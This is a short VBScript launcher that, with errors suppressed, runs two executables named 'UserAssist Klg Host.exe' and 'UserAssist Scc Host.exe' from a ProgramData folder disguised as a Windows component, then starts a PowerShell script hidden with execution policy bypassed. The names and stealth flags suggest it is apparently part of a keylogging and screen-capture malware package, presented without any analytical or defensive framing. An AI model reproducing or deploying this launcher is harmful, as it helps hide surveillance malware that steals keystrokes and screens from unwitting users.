On Error Resume Next

Set objShell = CreateObject("WScript.Shell")
objShell.CurrentDirectory = "C:\ProgramData\WindowsUserAssist"
objShell.Exec("UserAssist Klg Host.exe")
objShell.Exec("UserAssist Scc Host.exe")
objShell.Run "powershell -exec bypass -noP -nonI -wind hidden -File "".\UserAssist Updates.ps1"" ", 0, false
